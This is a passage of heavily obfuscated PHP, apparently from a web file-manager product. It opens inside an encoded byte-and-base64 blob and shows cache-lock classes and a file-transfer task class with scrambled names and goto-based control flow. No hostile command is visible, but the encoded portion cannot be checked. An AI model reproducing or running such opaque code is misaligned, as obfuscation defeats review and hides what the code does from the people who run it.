x7a\x92\x2f\xa6\xd1\x9a\x41\x79\x56\x3\x5f\xf\xe0\xb2\xd\x35\x7b\x5e\xe8\x5d\x6a\x4d\xc1\xb8\x0".base64_decode('N4GQ6ddzmQw73IdsIduq8BlNKJkz+SYHXcGG4W0ig4AFD1DQ/5QSd1kCRZLhww==').base64_decode('dVgIXQMWrQQuPqVRv1fVlZWVzsoq8IcdHxK+qraysiBJZWUt+oMjkC6VjKI1Bg==')._kodDe('LEweTzx0OoIuu+c7CViUhmRb5zh0BNtLXm9vzy9b4LL5lPpCDWanwds2B6uoLAQ=')."\xa0\x22\x21\xc5\x3e\xc\xec\xe4\x8f\x4c\xa\xdd\x1e\xe0\x5a\xa7\xdf\x80\x7\x1\x13\x84\x86\x85\xb4\x98\x5d\x96\x0\xc9\xf8\xd4\x83\x76\x78\x33\x71\x22\x5c\xcc\xc5\x77\x51\xea\xc5\xca"."\134\164\170\105\240\170\202\144\251\25\244\3\273\141\214\65\30\2\4\65\4\272\370\305\154\374\121\50\305\256\3\302\140\7\113\212\275\107\343\113\14\244\267\105\260\47"."\xa9\xe5\x23\x7c\x67\x83\xc1\x5\x2c\x84\x3a\xf\x85\x10\x8a\x32\xac\x9b\x64\x4\x28\xcd\xa3\x28\x42\x4f\x98\xc9\x81\x35\xba\x0\x37\xa0\xa6\x2c\x57\x92\x22\x42\xd9\xa2\xeb\x63\x40\x5a"."\40\253\112\347\17\153\307\111\5\220\263\161\361\251\107\76\37\321\333\73\330\262\245\166\234\60\170\272\306\157\11\25\74\124\105\103\302\335\71\252\51\16\375\27\43\11"."\xa\xf1\x52\x0\x36\x2b\x68\x62\xce\xae\x84\x2\xec\x51\xb6\x3c\x9e\xb8\xf0\x86\x92\xc1\xbd\x5c\x35\x31\x87\x76\xa2\xeb\x2b\x7c\xc\x2b\x1c\xd6\x1b\xc4\xe3\x2a\x3f\x77\xa5\x65\xc\x9"."\xe2\x80\x2b\xab\x6b\x7d\x60\xc8\xd\xb1\xaf\x0\xde\x59\x1c\xcc\x92\x17\xa6\x2c\x92\x88\x75\x48\x4c\x27\x2\xa1\x7d\x10\x7d\xce\x87\x60\xf\xbf\x7d\x24\xf3\x87\xc6\x84\xa4\xfc\x2a\x8f"."\0\264\332\352\10\21\115\314\263\274\10\204\342\205\170\322\216\114\200\254\145\100\271\305\12\141\55\373\21\134\241\362\246\111\236\176\22\156\216\221\144\334\140\11\352\2"."\104\375\244\252\321\103\174\70\32\374\170\315\12\57\300\62\262\24\50\345\303\153\305\32\267\343\354\13\351\307\305\64\25\354\74\123\73\211\332\127\330\361\210\50\122\303"."\xe5\xd2\xc6\x9e\x29\x2a\x82\x2e\x56\x94\x28\x98\x7b\xa4\x9b\x85\x5\xd4\x32\xfa\x20\x84\x80\xc\x41\xd9\x8f\x38\x6d\xef\x60\x4e\xa1\x2c\x93\x40\x4c\x24\x93\x93\x12\xd8\x26\x68\xe\x9b"."\324\65\323\24\157\277\172\342\2\5\364\213\33\146\30\147\161\316\343\365\130\16\153\4\117\222\54\51\40\332\264\166\231\122\153\144\23\343\102\216\156\71\107\157\13\332"."\355\146\20\165\66\51\375\245\56\70\63\354\105\1\70\235\41\301\210\241\110\15\44\23\313\102\66\15\135\211\151\72\22\351\204\73\213\31\63\250\364\211\101\277\306\104"."\x59\x78\x38\xa0\x14\x29\x2\xde\xd5\x16\x90\x13\x62\x1\x10\xb2\x72\xe2\xcd\x6f\xc1\x83\x27\x8\x9\x6e\x57\x85\x9d\xdc\x59\x25\x31\x16\x20\x82\x4b\xc6\x81\x69\x42\x4\x4a\x5f\x8c\x1b"."\xb0\x29\x57\x4\xfb\x45\x24\x43\x86\x72\x51\xa6\xc7\xb6\xed\xd0\xd4\x3a\x52\x12\x77\x49\x6a\xe3\x8\xb\x40\xb7\x85\x61\xf\xc\x31\xe\x14\xb\x7d\x6\xf2\x9e\x89\x59\x50\x9d\x5\x59"."\160\34\334\331\270\61\244\30\143\0\141\4\16\325\330\61\105\252\102\121\302\210\306\350\306\113\116\313\226\362\101\42\21\43\12\65\215\162\126\125\73\247\23\25\252\150"."\47\111\266\106\62\276\220\171\24\320\0\262\270\224\202\21\73\47\222\216\247\321\204\127\213\320\315\132\176\151\20\135\42\146\363\211\156\33\263\220\56\354\70\12\263\201"."\102\327\156\105\262\302\117\154\261\151\24\114\320\125\54\36\217\20\214\156\266\130\216\331\22\200\225\141\215\47\256\130\323\226\347\47\1\36\130\214\21\154\205\20\47\274"."\xa2\xbb\x59\x94\x8b\xf7\x83\x1b\xe1\x1\x90\x86\x1d\xbe\xa\x3\xc3\x4f\x9e\xf1\x85\x64\x6a\x3d\xc8\xe8\x12\x7\x87\x35\x6\x2c\x3c\xbd\x76\x31\xeb\x49\x72\x73\x84\x3c\xf\x54\x56\xe".base64_decode('b45YFAjtI+wGAJjJAbg/MhM2QwzQWIachiWADUAsuRmIpcorUULmqeDb2dbpZg==')."\xa0\x46\x3a\x4c\xec\x2e\x27\x91\x9a\xf8\x83\x33\xc4\x34\x8a\xdc\xc2\xc8\x83\x71\xd7\xf2\x64\x81\x35\xd5\x32\x9b\x18\xfa\x9c\x65\x3e\xad\xc6\x24\x7f\xa0\xd5\xd7\xe4\xf1\x37\xfb\x42\xb"."\45\350\201\200\237\313\43\63\150\353\162\107\72\37\74\71\24\363\243\314\303\60\374\164\106\1\133\350\214\63\166\330\340\214\257\140\52\43\270\333\267\26\213\161\124\321"."\xb\x4a\x4\x6c\x74\xda\x4a\x10\x50\x1e\xa8\xc9\x2a\x92\x3a\xc5\x15\x3c\x42\xe2\xac\xae\x14\xa6\x1f\x51\xd0\x9b\x94\xbc\xc5\x42\x86\x5c\x91\xd6\x90\xf4\xc5\x6b\x0\x4b\xc4\x9a\x1a\x6c"."\326\112\146\254\306\253\231\41\325\120\71\161\240\71\106\304\322\271\256\116\147\176\261\205\101\217\213\256\257\371\140\343\132\104\177\1\166\331\123\114\41\32\100\342\151\22".base64_decode('naJkqRaavLPCnZKjoOAuPqvLqqEIAOy3vKKchgQHKiR3BOfBsCB8o/F/Xbga5w==')."\xfe\x14\x6c\x4d\x53\xe3\xf4\xec\x9a\xd9\xba\x63\xe7\xc0\x4d\xe2\x53\x31\xb4\x9\x5\x3e\xed\xff\xab\x77\x7c\x7\x57\xbc\x47\xd0\x2d\x73\x6a\x67\x88\x1e\xaa\x25\xa7\xa\xec\xc4\x36\x82"."\x6f\xb2\xf3\x2a\x80\xd8\xa4\x8f\x64\xc5\x93\xf\x77\x9c\x3e\x4a\x44\x5\x35\xe8\xca\xc5\x4b\xd5\x9f\x30\xc0\xf9\x53\x98\x9c\x94\x6\xab\xc3\x12\xa\x90\x97\xe0\x11\x0\xe5\x64\xa9\x2e"."\2\54\150\62\354\226\223\77\233\237\177\273\251\233\345\141\306\202\72\240\361\321\330\345\200\174\22\27\323\131\2\251\136\252\104\372\37\376\364\203\124\107\257\335\360\52".base64_decode('kPsGbzprWoQwYvHKE1se1ETcB5dcoCGFlh4pAFhEej9tFzO2go6mMwlNHAZEAA==')."\301\76\202\237\35\201\46\307\370\13\213\175\16\300\210\53\146\241\263\173\134\316\230\205\32\366\55\204\263\63\200\50\204\200\360\157\175\226\4\102\4\346\305\102\224\255".base64_decode('dcEYAZnR5UvhKgv9hVf6La8MCKVPwT895JdSeXvReF2TppSzuW+yPBQtANoVLg==')."\211\241\134\360\124\133\316\60\262\105\334\374\263\347\107\370\362\242\161\2\112\241\207\56\232\307\310\152\3\113\126\277\343\334\235\73\337\201\254\56\270\331\71\26\263\161".base64_decode('QrZmokP1sBaW+xyY94EUiIcaR8Rv0awPdRpEUp1InGHAPCEBfSkk7kDPWGA6ZA==').base64_decode('fypFWD+MuIm5+1JaVE4FsXGMxdpcB3ILM32zJMMgt5zNjqlzJ/wI1r/nMj58tw==')."\311\2\325\5\271\110\64\254\304\47\15\374\2\7\111\16\152\353\304\107\13\244\333\142\221\364\170\7\375\100\311\251\105\170\236\320\135\170\34\4\215\167\50\173\43\130"."\271\221\23\71\227\50\270\220\4\122\235\304\47\330\262\100\41\102\300\125\217\76\320\252\27\31\335\37\201\62\74\264\76\246\203\21\26\375\64\53\11\306\365\303\60\227"._kodDe('MLP3i7kW6uzG9W50mzSrrtDRKzD9pc8KNYva9f+05A7ReZ3mJoozaQ11fSita1Q=').base64_decode('qgy2mZmFFbDfds6bDZUtQ9A+cGGtUJPGD8EyuTQ/YwQBqyRS0GGhhzk95UBHgA==')."\16\352\313\304\66\34\274\127\342\314\24\31\303\377\136\6\266\16\104\342\105\334\112\165\152\353\242\72\75\126\261\47\123\55\130\7\204\172\156\236\216\175\103\25\74\152".base64_decode('sDQdr55eM0cU4/n88OOKavxD3IKRMxOyo/OJl6xoJVG/VOLyRZFW+83C14AEFA==').base64_decode('tZLk/91S4EwxTirYVRY+dVYwJAgrBRsEYUOzHTZr8AzY4I3FWxh/DchaF367qg==')."\x48\x3f\x84\x8d\x88\x2f\xd\xfc\xd0\x8c\x96\x82\xe2\x65\x1a\x2a\x37\x4d\x5d\xb6\xca\x49\xc5\xc4\x1\x34\x12\x54\xf6\x50\xd1\x9b\x7a\x8a\xbd\xed\x68\x60\x88\x22\x81\x47\xb\xf2\x82\x58"."\xa2\xa9\xd9\xb5\x20\x30\x3b\xdc\xa8\x90\x12\x2e\x90\x49\x91\x6d\x17\xde\x38\xe4\x8b\xec\xff\x6e\x2\xa9\x48\x80\xa5\xa\x6e\x62\x50\xa4\xe7\xee\xf9\x94\x90\xd8\x1e\xea\xb1\xbd\xb4\xf6"."\43\355\306\114\27\23\177\234\62\175\374\7\115\252\240\71\123\314\0\232\140\302\275\160\151\314\332\127\133\361\40\33\57\243\327\41\215\225\250\220\13\23\36\46\342\216".base64_decode('GQSWC+amF53GEGYpteKPraCrKlwZjdaqZd0Kft/Emx+oIHEZFBaN9COkvWThog==')."\67\356\221\175\206\247\225\135\370\221\5\13\20\70\164\302\143\133\232\370\155\275\77\33\240\376\260\0\223\144\21\264\100\270\331\366\36\33\42\76\366\107\332\150\377\321".base64_decode('Ouc0Tbg5ZhEH2KskFvHAsD/PA9gp0d0dCDIMJ5snoXrI0BbXJuyNfBvkX2M91g==')."\151\175\311\63\51\66\13\272\20\260\55\153\172\121\17\336\173\304\347\47\204\360\43\157\143\370\233\162\342\377\317\117\366\375\377\172\251\257\246\222\52\225\55\317\271\265"."\x12\x6\x97\x72\x63\xa3\x82\xb3\x43\xac\xd0\xb4\xf5\xc3\xba\x45\x1e\x22\xc6\x12\xc\x75\x58\x42\x24\xc0\x17\x1c\xdc\x7b\x5c\xb6\x47\x4d\x5d\xcc\xf2\x90\xba\x9c\xa0\x9e\x28\x64\x7a\x60".base64_decode('IsMHigoUlPRhL4CRA+zdqWKBwlcXLchH+U3ezIwaGyhyAAenwG91DShwCQXJOA==')."\x7d\x2\xcc\x4\x75\xb2\xe1\xa6\x5f\x31\x28\x66\x41\x56\x92\x92\x45\xf1\x5e\x58\x20\x4b\x5\xb2\x72\x42\x89\x7b\xe7\x53\xf2\x81\xee\x96\x12\x2a\x22\x52\xe\xb\xa8\x80\xde\x84\x2d\xbb".base64_decode('oAUoDg9/XdRlfSyT5Gi3PauEExni2Fq0yYXnsYW52WIWs0BLTKtOhr3QWGl/sg==').base64_decode('scpZWBk2hIb6hCCU+ClCogMHdCBYJA9eliGeZgz0L74I2fuagiAMvsT+0sXcqQ==')."\153\210\25\263\102\231\126\103\60\200\23\236\13\54\170\302\314\246\270\7\342\21\77\311\122\65\344\372\223\164\73\324\325\136\206\154\371\11\246\2\356\136\170\276\327\114"."\x67\xb1\xb6\x8b\x34\x1a\x5f\x96\xb1\xa8\x9e\xc\xd1\x6f\xb1\xf5\x4e\x8d\x60\xa4\x6a\x8d\x80\x56\xc5\xd6\x95\x32\xaf\x58\xb2\x98\xa6\x1b\x42\x32\x6\x2f\x96\x16\xbe\x12\x67\x5a\x46\x93"."\373\143\265\373\141\105\242\60\226\156\55\102\56\71\66\24\101\302\251\32\140\157\343\126\357\312\50\22\201\251\343\46\372\246\63\77\27\262\36\313\61\27\223\5\224\52"."\247\372\205\150\224\213\272\376\0\277\360\352\220\217\337\245\106\321\130\233\355\31\222\115\172\270\145\317\325\145\221\45\204\103\274\30\302\35\157\341\71\15\77\76\22\66"."\x7f\x9a\xd\xa\x23\x9c\xd6\xda\xe0\x2\xf1\xe7\xd4\x4e\x1e\xe2\x47\x33\x9c\xfb\x8d\xc7\xd9\xc3\x9f\x96\xa4\x71\xca\xff\x33\x28\x80\xf0\x37\x42\x21\xaf\x23\xdc\x46\xe4\xa6\xae\x4a\xde"."\xfe\x16\x9d\x4b\xbc\xc1\x68\x49\x58\x8\xe5\xb7\x15\xed\xfd\x42\x6b\x81\xc1\xc9\x9\x59\x46\x30\x2b\x20\xd8\xc2\x41\xd8\xe7\x2e\xb3\x38\x11\x44\x8\x68\x97\xcd\x4d\x51\x70\x1b\x99\x80"."\xcc\xab\xb4\x5e\xaa\x64\xc9\xd8\x64\x80\x34\xc8\xa\xde\x69\x81\xda\x84\x22\xa8\x6e\xa0\xfb\xb3\x2d\xca\x10\x1f\x2b\xb5\x1e\xba\x89\x12\xbb\x30\xb7\x4a\xca\x2f\x14\x27\x1e\xc8\x8d\x99"."\41\124\274\22\216\156\326\41\26\56\240\362\10\272\13\151\226\301\27\250\30\353\30\111\31\24\43\55\315\261\117\55\342\347\71\136\142\140\32\151\64\135\124\103\134\230"."\136\261\265\136\314\140\357\31\316\141\344\125\63\226\24\204\214\302\310\102\270\136\60\250\244\242\342\355\265\267\212\216\251\135\364\342\205\24\264\107\70\325\17\153\105\362".base64_decode('4BYVzYaj0JPajDm05B1jCGBeHAXzFkTTzILOQshnyjljjO4VDh4R3+NFOmwTcg==')."\161\322\261\306\263\150\342\302\352\10\306\331\123\43\171\277\170\53\270\230\156\73\71\55\326\212\242\211\307\154\105\221\147\202\211\173\253\42\104\224\306\24\41\233\374\230"."\xbd\x90\x40\xf3\xb8\x22\x87\xfe\xb8\x4c\xb8\xf9\x8a\x7e\x53\x8a\x44\x8b\x16\x4\xc5\x6d\xc\x82\x45\x97\xbe\x61\x3d\xfc\xb7\xc1\xc5\x81\xa1\x86\x40\x40\x14\xe3\xf\xe7\xa\xd6\xa8\x53"."\54\44\75\227\31\310\320\33\30\240\164\156\256\5\255\61\331\363\262\254\272\202\322\254\250\231\311\11\146\226\105\215\143\35\350\361\361\2\21\65\45\123\25\270\140\127"."\x8c\xc5\x11\xcd\x54\x63\x82\x1\x92\xfd\xb9\x75\x1c\x4f\x2b\x49\x9\x9a\x35\x9b\x52\x8b\x8b\xf1\x96\x83\xe7\x22\x6a\x1f\x4\x22\x7c\x18\xd7\x26\x5b\xac\xac\xf1\xc6\x4e\xd4\xe8\xf8\x34"."\xad\x9\x1e\xa6\xb2\x13\x14\x28\x37\x39\xf0\x7e\x89\xa3\xe1\xfb\xef\xe\x18\x17\xd6\xb2\xe8\xb7\x51\x33\x4d\x4a\x49\x80\x60\x8f\x52\x22\xee\xd\x6e\x7a\xe\xc1\xf8\x0\x7c\xf1\xe3\x12"."\x38\x8a\x48\x83\x8f\xd0\x11\x91\xd\xf4\x49\xce\xf5\xa0\x24\x19\x52\x70\x2c\x22\x36\x96\x0\x3c\x19\x60\x1\x71\x4f\x23\x87\x71\x2d\x39\xdb\x89\x22\x7\x0\xe9\x30\xaa\xd\x53\x27\x65".strrev('øBf|Ç±Ù""OÒq\'¨_ş&ãnÅîJh›à€Ühs¶V•o&Æğ')."\143\45\20\245\43\57\2\373\205\104\372\42\350\41\325\273\304\27\12\207\12\242\72\75\241\120\167\40\330\214\335\110\26\104\243\134\202\325\112\101\124\147\133\240\143\254"."\x38\x6f\xbb\xc7\xe7\x2f\x88\x83\x56\x2c\x1d\x11\xee\xd3\x6\x47\xf9\x3a\x51\x2b\x3d\x7e\x7f\xa0\x7b\xac\x56\xf8\x9a\x16\xf2\x96\xa0\x33\x53\xae\xd5\xce\x26\x35\xaa\xa2\xa6\xca\xff\x90"."\234\242\102\262\160\301\113\111\163\347\106\74\217\125\366\27\347\325\240\236\276\330\207\325\331\272\315\240\214\42\54\51\10\132\240\164\220\262\203\131\2\205\156\65\331\342"."\146\134\60\352\220\146\63\164\307\247\302\56\313\121\262\0\107\213\5\221\30\1\11\305\335\25\1\52\212\216\230\250\30\55\124\324\243\130\76\42\260\245\13\350\363\127"."\375\132\124\120\304\143\241\204\334\276\42\143\54\230\35\341\157\22\375\177\0\352\352\112\143\64\235\0\0".base64_decode('').base64_decode('')."".""."", 10, -8))); goto c¦Å÷ƒ¿Ø; aÇÈßÊÜ‚: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $e„È¸ÊÀ¨Ò =& $_SERVER[´¬]; $EĞÔ„‰ù…½ = $GLOBALS[$e„È¸ÊÀ¨Ò[6]][$e„È¸ÊÀ¨Ò[346]]; self::$cachePath = $EĞÔ„‰ù…½[$e„È¸ÊÀ¨Ò[192]][$e„È¸ÊÀ¨Ò[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($cê•¯é¦œÍ, $fß°êëĞ‹Ã = 0) { goto cÆœŒëÕªµ; aÄ›Ó¸¾¡¹: $this->unlock($cê•¯é¦œÍ); return !1; goto e•ÈŠ…°ŠÁ; cÆœŒëÕªµ: $e°ˆèŞœØ =& $_SERVER[´¬]; $e’õ¾ùæŒ£ = microtime(!0); $fâÁË¶¢îï = $e’õ¾ùæŒ£ + $fß°êëĞ‹Ã + 0.0001; goto còö±ö¢öã; còö±ö¢öã: $cÖŸÙ÷± = rtrim(self::$cachePath, $e°ˆèŞœØ[8]) . $e°ˆèŞœØ[818] . md5($cê•¯é¦œÍ) . $e°ˆèŞœØ[815]; if (file_exists($cÖŸÙ÷±) && filemtime($cÖŸÙ÷±) && filemtime($cÖŸÙ÷±) < time() - 10) { @unlink($cÖŸÙ÷±); } do { if (file_exists($cÖŸÙ÷±)) { cacheLockWait(); continue; } $b•‚èÈ„ = fopen($cÖŸÙ÷±, $e°ˆèŞœØ[819]); if (!$b•‚èÈ„) { return !1; } $e‡¯§Ğ·ÓÏ = flock($b•‚èÈ„, LOCK_EX | LOCK_NB); self::$caches[$cê•¯é¦œÍ] = array($e°ˆèŞœØ[820] => $b•‚èÈ„, $e°ˆèŞœØ[192] => $cÖŸÙ÷±); fwrite($b•‚èÈ„, $fâÁË¶¢îï); clearstatcache(); if ($b•‚èÈ„ && $e‡¯§Ğ·ÓÏ) { return !0; } cacheLockWait(); } while (microtime(!0) < $fâÁË¶¢îï); goto aÄ›Ó¸¾¡¹; e•ÈŠ…°ŠÁ: } public function lockGet($f®æÅ‡ÈÈ) { $f÷±éÒÀÍ± =& $_SERVER[´¬]; $eœ‚İœ‰–ä = rtrim(self::$cachePath, $f÷±éÒÀÍ±[8]) . $f÷±éÒÀÍ±[818] . md5($f®æÅ‡ÈÈ) . $f÷±éÒÀÍ±[815]; return file_exists($eœ‚İœ‰–ä); } public function unlock($b¼‹ƒ©ˆ¾É) { goto CÒ´ô“ÄÎ; eÄ˜Šà”šø: unset(self::$caches[$b¼‹ƒ©ˆ¾É]); goto A¢”¯Œ£ãÂ; Eàö¨…ÂÛ: @flock($EÛáØÜ ªµ[$F«´Âˆé¸[820]], LOCK_UN); @fclose($EÛáØÜ ªµ[$F«´Âˆé¸[820]]); @unlink($EÛáØÜ ªµ[$F«´Âˆé¸[192]]); goto eÄ˜Šà”šø; CÒ´ô“ÄÎ: $F«´Âˆé¸ =& $_SERVER[´¬]; $EÛáØÜ ªµ = self::$caches[$b¼‹ƒ©ˆ¾É]; if (!$EÛáØÜ ªµ) { return; } goto Eàö¨…ÂÛ; A¢”¯Œ£ãÂ: } } class CacheLockRedis { public function lock($aÊé‹óšó£, $F’²¤•¯ïÏ = 10) { $BÕÖ¤±ù„Ó = Cache::init(); $F‹µ÷“Â¥¤ = microtime(!0) + $F’²¤•¯ïÏ; while (microtime(!0) < $F‹µ÷“Â¥¤) { $fÚì°Óœù² = $BÕÖ¤±ù„Ó->get($aÊé‹óšó£); if (!$fÚì°Óœù²) { $Aóù‘á­ñâ = $BÕÖ¤±ù„Ó->setLock($aÊé‹óšó£, $F‹µ÷“Â¥¤, $F’²¤•¯ïÏ); if ($Aóù‘á­ñâ) { return !0; } } else { if ($fÚì°Óœù² < microtime(!0)) { $BÕÖ¤±ù„Ó->set($aÊé‹óšó£, $F‹µ÷“Â¥¤, $F’²¤•¯ïÏ * 2); if ($BÕÖ¤±ù„Ó->get($aÊé‹óšó£) === $fÚì°Óœù²) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($BØ¯œá¦¦) { return Cache::init()->get($BØ¯œá¦¦); } public function unlock($CÜ‚­½Ğ) { return Cache::init()->remove($CÜ‚­½Ğ); } } class CacheLockMemcached { public function lock($Eõ´¾®É¦, $eÔè†×°õ… = 0) { $c«‰ÙÙ§ïº = Cache::init(); $B™†ƒ‚øŠ = microtime(!0) + $eÔè†×°õ…; while (microtime(!0) < $B™†ƒ‚øŠ) { $BÑ£–áÇ®Œ = $c«‰ÙÙ§ïº->get($Eõ´¾®É¦); if (!$BÑ£–áÇ®Œ || $BÑ£–áÇ®Œ < microtime(!0)) { $AíÃ‡ˆ = $c«‰ÙÙ§ïº->handle->add($Eõ´¾®É¦, $B™†ƒ‚øŠ, $eÔè†×°õ…); if ($AíÃ‡ˆ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($C‚À½­²À”) { return Cache::init()->get($C‚À½­²À”); } public function unlock($dÒ´¤´¾Ì«) { return Cache::init()->remove($dÒ´¤´¾Ì«); } } goto Dõ×éğá; B†‚‰ÀÉ‘Ë: class TaskFileTransfer extends Task { protected function startAfter() { goto b¡š…±±ÕÅ; b¡š…±±ÕÅ: $AªÓ†øÍƒß =& $_SERVER[´¬]; $aÆ‡ášà“ =& $this->task; $this->sourceCopyFolder = !1; goto CÈÙ¦ÀØ´à; e®•ÆùëÚŠ: $aÆ‡ášà“[$AªÓ†øÍƒß[1567]] = LNG($AªÓ†øÍƒß[1568]); $aÆ‡ášà“[$AªÓ†øÍƒß[1569]] = 0; $aÆ‡ášà“[$AªÓ†øÍƒß[1570]] = 0; goto D¼Â£ãÈ³ö; cØ§½¿ŸÊ‚: $aÆ‡ášà“[$AªÓ†øÍƒß[1573]] = 0; $aÆ‡ášà“[$AªÓ†øÍƒß[1574]] = 0; if (!$aÆ‡ášà“[$AªÓ†øÍƒß[1432]]) { $aÆ‡ášà“[$AªÓ†øÍƒß[1432]] = LNG($AªÓ†øÍƒß[1575]); } goto FÃ³ë¤·Ï•; D¼Â£ãÈ³ö: $aÆ‡ášà“[$AªÓ†øÍƒß[1024]] = $AªÓ†øÍƒß[33]; $aÆ‡ášà“[$AªÓ†øÍƒß[1571]] = $AªÓ†øÍƒß[33]; $aÆ‡ášà“[$AªÓ†øÍƒß[1572]] = 0; goto cØ§½¿ŸÊ‚; B›ƒìå‘êã: Hook::bind($AªÓ†øÍƒß[538], array($this, $AªÓ†øÍƒß[1557])); Hook::bind($AªÓ†øÍƒß[540], array($this, $AªÓ†øÍƒß[1557])); Hook::bind($AªÓ†øÍƒß[542], array($this, $AªÓ†øÍƒß[1557])); goto B×Š±Û“èã; B×Š±Û“èã: Hook::bind($AªÓ†øÍƒß[1558], array($this, $AªÓ†øÍƒß[1559])); Hook::bind($AªÓ†øÍƒß[558], array($this, $AªÓ†øÍƒß[1560])); $this->sourceModelCopyFlag = !1; goto Fï÷ö˜¼í…; CÈÙ¦ÀØ´à: Hook::bind($AªÓ†øÍƒß[1549], array($this, $AªÓ†øÍƒß[1550])); Hook::bind($AªÓ†øÍƒß[1111], array($this, $AªÓ†øÍƒß[1551])); Hook::bind($AªÓ†øÍƒß[1552], array($this, $AªÓ†øÍƒß[1553])); goto EƒÓËÛƒ…Û; Fï÷ö˜¼í…: Hook::bind($AªÓ†øÍƒß[1561], array($this, $AªÓ†øÍƒß[1562])); Hook::bind($AªÓ†øÍƒß[1563], array($this, $AªÓ†øÍƒß[1564])); Hook::bind($AªÓ†øÍƒß[1565], array($this, $AªÓ†øÍƒß[1566])); goto e®•ÆùëÚŠ; EƒÓËÛƒ…Û: Hook::bind($AªÓ†øÍƒß[565], array($this, $AªÓ†øÍƒß[1554])); Hook::bind($AªÓ†øÍƒß[566], array($this, $AªÓ†øÍƒß[1555])); Hook::bind($AªÓ†øÍƒß[568], array($this, $AªÓ†øÍƒß[1556])); goto eªËäĞƒ¦ø; eªËäĞƒ¦ø: Hook::bind($AªÓ†øÍƒß[569], array($this, $AªÓ†øÍƒß[1556])); Hook::bind($AªÓ†øÍƒß[536], array($this, $AªÓ†øÍƒß[1557])); Hook::bind($AªÓ†øÍƒß[533], array($this, $AªÓ†øÍƒß[1557])); goto B›ƒìå‘êã; FÃ³ë¤·Ï•: } protected function endAfter() { goto D­†ë«¢á; ağÂ³¥ì¶ô: Hook::unbind($aê™ôˆÕÕ¦[1561], array($this, $aê™ôˆÕÕ¦[1562])); Hook::unbind($aê™ôˆÕÕ¦[1563], array($this, $aê™ôˆÕÕ¦[1564])); Hook::unbind($aê™ôˆÕÕ¦[1565], array($this, $aê™ôˆÕÕ¦[1566])); goto eãÄìÕ¡›Æ; a†õéùõõ: Hook::unbind($aê™ôˆÕÕ¦[533], array($this, $aê™ôˆÕÕ¦[1557])); Hook::unbind($aê™ôˆÕÕ¦[538], array($this, $aê™ôˆÕÕ¦[1557])); Hook::unbind($aê™ôˆÕÕ¦[540], array($this, $aê™ôˆÕÕ¦[1557])); goto e¾ãÑå½Á™; a¢óİ‹“‚ : Hook::unbind($aê™ôˆÕÕ¦[1552], array($this, $aê™ôˆÕÕ¦[1553])); Hook::unbind($aê™ôˆÕÕ¦[565], array($this, $aê™ôˆÕÕ¦[1554])); Hook::unbind($aê™ôˆÕÕ¦[566], array($this, $aê™ôˆÕÕ¦[1555])); goto dÌÚ†Ã¥ßê; e¾ãÑå½Á™: Hook::unbind($aê™ôˆÕÕ¦[542], array($this, $aê™ôˆÕÕ¦[1557])); Hook::unbind($aê™ôˆÕÕ¦[1558], array($this, $aê™ôˆÕÕ¦[1559])); Hook::unbind($aê™ôˆÕÕ¦[558], array($this, $aê™ôˆÕÕ¦[1560])); goto ağÂ³¥ì¶ô; dÌÚ†Ã¥ßê: Hook::unbind($aê™ôˆÕÕ¦[568], array($this, $aê™ôˆÕÕ¦[1556])); Hook::unbind($aê™ôˆÕÕ¦[569], array($this, $aê™ôˆÕÕ¦[1556])); Hook::unbind($aê™ôˆÕÕ¦[536], array($this, $aê™ôˆÕÕ¦[1557])); goto a†õéùõõ; D­†ë«¢á: $aê™ôˆÕÕ¦ =& $_SERVER[´¬]; Hook::unbind($aê™ôˆÕÕ¦[1549], array($this, $aê™ôˆÕÕ¦[1550])); Hook::unbind($aê™ôˆÕÕ¦[1111], array($this, $aê™ôˆÕÕ¦[1551])); goto a¢óİ‹“‚ ; eãÄìÕ¡›Æ: } public function copyMoveStart($e—İÉ™±Ï›, $Bˆè„¼Ã’æ, $d½¿´«ãØª, $d‚×‚éõª°) { goto cÖŒ‘Í®‹¸; e´œã…‹Å‘: if (substr($Bˆè„¼Ã’æ, 0, strlen($DÊßäœİîœ)) == $DÊßäœİîœ) { return; } if (substr($d‚×‚éõª°, 0, strlen($DÊßäœİîœ)) == $DÊßäœİîœ) { return; } $f–ÒùÈ†Œò =& $this->task; goto Bî®—´öÓ; cÖŒ‘Í®‹¸: $cêäù÷ÌñÓ =& $_SERVER[´¬]; self::log($cêäù÷ÌñÓ[1576] . $Bˆè„¼Ã’æ . $cêäù÷ÌñÓ[67] . $d‚×‚éõª°); $DÊßäœİîœ = rtrim(TEMP_FILES, $cêäù÷ÌñÓ[8]); goto e´œã…‹Å‘; Bî®—´öÓ: $f–ÒùÈ†Œò[$cêäù÷ÌñÓ[1577]] = KodIO::transferType($e—İÉ™±Ï›, $d½¿´«ãØª); $this->update(); goto CÎ‹‹–È£; CÎ‹‹–È£: } public function updateAfter() { goto Fã—í–áÜÀ; B…ˆñÄø‹Í: $AÄ¬„Å –[$eÈğÌÜÇ‘’[1527]] = $AÄ¬„Å –[$eÈğÌÜÇ‘’[1574]] / $AÄ¬„Å –[$eÈğÌÜÇ‘’[723]]; if ($AÄ¬„Å –[$eÈğÌÜÇ‘’[1527]] > 0) { $BóÈ¦šÒœè = timeFloat() - $AÄ¬„Å –[$eÈğÌÜÇ‘’[749]] - $AÄ¬„Å –[$eÈğÌÜÇ‘’[1530]]; $AÄ¬„Å –[$eÈğÌÜÇ‘’[1531]] = $BóÈ¦šÒœè * (1 - $AÄ¬„Å –[$eÈğÌÜÇ‘’[1527]]) / $AÄ¬„Å –[$eÈğÌÜÇ‘’[1527]]; } goto DãøšÓì’‹; fºÜÔí’: if ($this->sourceModelCopyFlag) { return; } if ($AÄ¬„Å –[$eÈğÌÜÇ‘’[1577]] == $eÈğÌÜÇ‘’[1183]) { return; } if ($AÄ¬„Å –[$eÈğÌÜÇ‘’[1577]] == $eÈğÌÜÇ‘’[1095] || $AÄ¬„Å –[$eÈğÌÜÇ‘’[1577]] == $eÈğÌÜÇ‘’[107]) { if ($AÄ¬„Å –[$eÈğÌÜÇ‘’[1571]]) { $AÄ¬„Å –[$eÈğÌÜÇ‘’[1574]] = $AÄ¬„Å –[$eÈğÌÜÇ‘’[1573]] + $AÄ¬„Å –[$eÈğÌÜÇ‘’[1570]]; } } else { if ($AÄ¬„Å –[$eÈğÌÜÇ‘’[1577]] == $eÈğÌÜÇ‘’[1184]) { if ($AÄ¬„Å –[$eÈğÌÜÇ‘’[1571]] == $eÈğÌÜÇ‘’[1095]) { $AÄ¬„Å 